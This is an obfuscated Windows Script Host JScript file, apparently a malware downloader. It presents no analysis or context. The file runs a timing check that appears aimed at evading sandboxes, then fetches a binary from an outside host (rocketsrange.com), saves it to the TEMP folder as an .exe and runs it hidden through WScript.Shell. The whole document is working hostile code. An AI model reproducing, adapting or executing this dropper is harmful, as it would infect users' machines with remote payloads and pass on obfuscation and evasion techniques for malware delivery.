var _X = false;
var _N0 = "CreateObject";
var _X0 = function _N() {return WScript[_N0]("WScript"+".Shell");}(), _C = 11;
var _KX = "MSXML2.XMLHTTP";
var _Y = 2123213;
var _V = 0;
function _NR(_H){_X0["Run"](_H, _V, _V);};
function _D(){return _KX + "";};
function _G(_RN, _GJ){_V = _V * 1; return _RN - _GJ;};
function _R(){return _N0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _X = true;
  @end
@*/
if (_X)
{
var _FK = "";
function _Z(){return 22;};
var _J = 0; var _CP = 0;
function _NX()
{
var _TB = new this["Date"]();
var _A = _TB["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _TB = new this["Date"]();
var _VC = _TB["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _TB = new this["Date"]();
var _W = _TB["getUTCMilliseconds"]();
var _J = "_N1";
_J = _G(_VC, _A);
var _CP = "_K";
_CP = _G(_W, _VC);
_FK = "open";
return _G(_J, _CP);
}
var _ND = false;
var _JL = false;
for (var _G0 = _V; _G0 < _Z() * 1; _G0++){if (_NX() != _V){
_ND = true; 
_CP = "31" + 11 * _J + _CP; 
_JL = true; 
break;
}}
function _PI() {return ((_ND == true) && (_ND == _JL)) ? 1 : _V;};
if (_ND && _PI() && _JL){
function _IJ() {return _X0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "w9iGqzLT4a7cM.ex" + "e";};
 _ZR = _D();
 _BH = WScript[_N0](_ZR);
 var _JX = 1;
 while (_JX){
try {
	if (_JX == 1)
	{
		_BH[_FK]("GET", "http://rocketsrange.com/b5ksa", false);
		_BH["send"]();
		_M0 = "Sleep";
	}
	WScript[_M0](_Z() + 120); 
	if (_BH["readystate"] < 2 * 2) continue;
	_JX = _V;
	function _M(_QE) {var _LG = (1, 2, 3, 4, 5, _QE); return _LG;};
	_E = WScript[_R()]("ADODB.Stream");
	_ZR = _E;
	_ZR[_FK]();
	_ZR["type"] = _M(1);
	_ZR["write"](_BH["ResponseBody"]);
	_E["position"] = _M(_V);
	_ZR["Save" + "ToFile"](_IJ(), 2);
	_E["cl"+"ose"]();
	_BW = _IJ();
	_NR(_BW);
} catch(_NV){};
}
}
}

